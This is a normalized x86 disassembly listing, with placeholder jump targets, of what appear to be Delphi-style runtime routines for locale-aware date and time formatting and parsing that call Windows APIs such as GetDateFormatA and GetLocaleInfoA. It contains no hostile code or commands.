lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40431c
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40436c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4045cc
sub_40a178
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a8f9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a900
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4040d0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c6c0
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c6a0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409db4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c6c0
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409db4
pop ecx
mov al [ eax + lookup_table_40a25b ]
jmp [ eax * 4 + jump_table_40a294 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409e90
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409e90
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409f08
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409df8
pop ecx
jmp r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409e90
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_40a070
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409df8
pop ecx
jmp r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409e90
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409e64
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409ec8
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409ec8
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409ec8
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409e64
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409e64
pop ecx
push ebp
call sub_409ec8
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409ec8
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408a48
test eax eax
jne r-xdata
push ebp
call sub_409e64
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a178
pop ecx
push ebp
call sub_409ec8
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409e18
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409e18
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409e18
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409e90
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409e18
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409e18
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409e18
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a178
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a178
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409e18
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408a48
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409db4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a178
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409db4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409db4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409df8
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409df8
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408a48
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409db4
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409db4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409df8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409df8
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c6c0
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408a48
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409db4
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a178
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409e18
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408a48
test eax eax
jne r-xdata
push ebp
call sub_409e90
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409df8
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409df8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409df8
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c6c0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a178
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409db4
pop ecx
jmp r-xdata
push ebp
call sub_409e90
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca0
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409df8
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408a48
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408a48
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408a48
test eax eax
jne r-xdata
jmp r-xdata
sub_40a92c
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_40a178
pop ecx
push ebp
mov eax ebx
call sub_40a178
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40419c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a9b4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40436c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a9d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a9b4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40436c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40aa6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40aae5
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aaec
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a9b4
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40436c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4080b0
test eax eax
jne r-xdata
mov eax edi
call sub_40436c
add [ esi ] eax
mov bl 0x1
sub_40aaf8
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a9b4
mov eax esi
call sub_40436c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40ab30
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40436c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40ab7c
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40436c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c704
mov [ ebx ] eax
jmp r-xdata
sub_40abc4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40456c
push eax
mov eax [ ebx ]
call sub_40456c
pop edx
call sub_40c7ec
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40ac18
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409da0
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40ac74
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40af8f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40ab30
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c7b4
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a9d8
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40ab7c
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4045cc
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_408120
mov eax [ ebp - 0x1c ]
call sub_40abc4
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af96
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_4040d0
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aaf8
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a9d8
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aaf8
test al al
je r-xdata
call sub_409da0
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a9d8
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_40998c
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4046b0
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40aaf8
mov edx ebx
mov eax esi
call sub_40a9b4
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40436c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40ab7c
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40ac18
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a9b4
mov eax esi
call sub_40436c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409da0
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40436c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4045cc
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_4080b0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40436c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4045cc
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_4080b0
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40afb8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aa6c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aa6c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a9d8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a9b4
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aaf8
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a9d8
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aa6c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aaf8
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a9b4
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409844
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a9d8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40aa6c
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40aaf8
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40aa6c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a9d8
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40b1ac
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ac74
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40436c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b1e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40afb8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40436c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40b214
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_40b248
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0xb
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e5c
sub_40b248
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40ac74
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40b1e0
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40436c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40afb8
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b2d4
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40419c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b320
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_404100
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40419c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b36c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b394
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b320
